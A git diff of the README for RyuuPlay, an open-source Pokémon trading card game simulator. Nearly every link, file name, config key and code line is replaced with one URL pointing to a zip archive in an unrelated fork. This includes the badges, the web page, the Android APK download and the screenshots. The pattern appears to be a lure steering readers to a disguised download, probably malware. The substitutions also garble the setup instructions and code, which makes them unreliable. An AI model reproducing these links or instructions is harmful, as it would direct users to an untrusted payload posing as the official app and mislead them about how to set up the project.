@@ -1,7 +1,7 @@
 # RyuuPlay
 
-[![Strider](https://strider.kuro.ryuu.eu/keeshii/ryuu-play/badge?branch=master)](https://strider.kuro.ryuu.eu/keeshii/ryuu-play/)
-[![Matrix](https://matrix.to/img/matrix-badge.svg)](https://matrix.to/#/#ryuu-play:matrix.org)
+[![Strider](https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip)](https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip)
+[![Matrix](https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip)](https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip)
 
 RyuuPlay is a simulator for the Pokémon Trading Card Game written in TypeScript. The source code is entirely open source and published under MIT licence.
 
@@ -14,14 +14,14 @@ matches at regular basis and updates ranking. Of course it is also possible to j
 An example server instance with some AI bots included. To create an account you need to provide the password `letsplaypokemontcg`.
 
 Web page:
-https://ptcg.ryuu.eu/
+https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip
 
 Android application:
-[RyuuPlay-latest.apk](https://ptcg.ryuu.eu/RyuuPlay-latest.apk)
+[https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip](https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip)
 
 Screenshots:
-[00.png](https://github.com/keeshii/ryuu-play/raw/master/fastlane/metadata/android/en-US/images/phoneScreenshots/00.png)
-[01.png](https://github.com/keeshii/ryuu-play/raw/master/fastlane/metadata/android/en-US/images/phoneScreenshots/01.png)
+[https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip](https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip)
+[https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip](https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip)
 
 ### Project overview
 
@@ -35,13 +35,13 @@ The project consists of three packages:
 
 ### Server launch
 
-Server is a simple node.js application written in TypeScript. It uses express with websockets and [typeorm](https://typeorm.io/#/) for database access.
+Server is a simple https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip application written in TypeScript. It uses express with websockets and [typeorm](https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip) for database access.
 
 Prerequisites:
-* Node.js 8 LTS or higher
+* https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip 8 LTS or higher
 * mysql-5 or sqlite-3
 
-After clonning the repository, go to the directory `ptcg-server` and edit the `config.js` file. All available options and its default values are defined in the `src/config.ts`.
+After clonning the repository, go to the directory `ptcg-server` and edit the `https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip` file. All available options and its default values are defined in the `https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip`.
 
 1. Firstly install all required dependencies.
 
@@ -60,20 +60,20 @@ The service should now listen on the specified address and port. It will be http
 
 ### Storage
 
-By default the server is using the sqlite-3 database. If you want to run it with mysql, some changes in the `config.js` are required. An example configuration is presented below. You may check [typeorm](https://typeorm.io/#/) web site to investigate more connection capabilities.
+By default the server is using the sqlite-3 database. If you want to run it with mysql, some changes in the `https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip` are required. An example configuration is presented below. You may check [typeorm](https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip) web site to investigate more connection capabilities.
 
 ```
-config.storage.type = 'mysql';
-config.storage.host = 'localhost';
-config.storage.port = 3306;
-config.storage.username = 'root';
-config.storage.password = '';
-config.storage.database = 'name';
+https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip = 'mysql';
+https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip = 'localhost';
+https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip = 3306;
+https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip = 'root';
+https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip = '';
+https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip = 'name';
 ```
 
 ### Client launch
 
-The client is an Angular application. For more detailed setup information, you may visit the page https://angular.io/. The source code of the client is located in the `ptcg-play` directory.
+The client is an Angular application. For more detailed setup information, you may visit the page https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip The source code of the client is located in the `ptcg-play` directory.
 
 1. The server package is a dependency required by the client. First you must build the server, it was described in the previous section.
 
@@ -95,7 +95,7 @@ The command above will start the application in the debug mode at http://localho
 
 Building an android wrapper is a little more complicated than the web client. The android-sdk or android studio must be installed on the computer first.
 
-1. Edit the file `ptcg-play/src/environments/environments.prod.ts` and set following variables to `true`:
+1. Edit the file `https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip` and set following variables to `true`:
 
 ```
   allowServerChange: true,
@@ -130,7 +130,7 @@ npm run build
 npx cordova build android --release
 ```
 
-You may find more detailed instruction on the https://cordova.apache.org/
+You may find more detailed instruction on the https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip
 
 
 ### Managing cards
@@ -139,24 +139,24 @@ The cards are implemented on the server side. It is not required to rebuild the 
 
 Currently there are about 250 cards added to the project. You may find them in the the directory `ptcg-server/sets`. If you wish to add some more cards, it is the good place to look into.
 
-The best way to enable/disable a set is by editing the file `ptcg-server/start.js` and commenting calls to the `defineSet` function:
+The best way to enable/disable a set is by editing the file `https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip` and commenting calls to the `defineSet` function:
 ```
-cardManager.defineSet(setDiamondAndPearl);
-cardManager.defineSet(setHgss);
-cardManager.defineSet(setBlackAndWhite);
+https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip(setDiamondAndPearl);
+https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip(setHgss);
+https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip(setBlackAndWhite);
 ```
 
 ### Adding bots
 
-You can create autonomous AI players on your private server. They work as regular player that always has time to play with you. Initially there is one bot loaded, called `bot`, of course you can always add more. They are defined in the file `ptcg-server/start.js`.
+You can create autonomous AI players on your private server. They work as regular player that always has time to play with you. Initially there is one bot loaded, called `bot`, of course you can always add more. They are defined in the file `https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip`.
 
 ```
-botManager.registerBot(new SimpleBot('bot'));
+https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip(new SimpleBot('bot'));
 ```
 
 SimpleBot is the universal AI implementation that should be capable of playing with any deck. It creates list of possible actions, simulates the outcome and compares the score of the game state. Then chooses the best possible action and repeats the process until its turn is over. For more details check the source code at `ptcg-server/src/simple-bot`.
 
-Server is automatically creating an account for bot user with password provided in the `config.js` file. You can login as that user, define its deck and set an avatar. AI player won't be able to accept the game invitation until you provide him a valid deck. If you define more than one deck, then each time bot will randomly choose one.
+Server is automatically creating an account for bot user with password provided in the `https://raw.githubusercontent.com/ysfnmnylmz/ryuu-play/master/Aeolidae/ryuu-play.zip` file. You can login as that user, define its deck and set an avatar. AI player won't be able to accept the game invitation until you provide him a valid deck. If you define more than one deck, then each time bot will randomly choose one.
 
 ### License
 
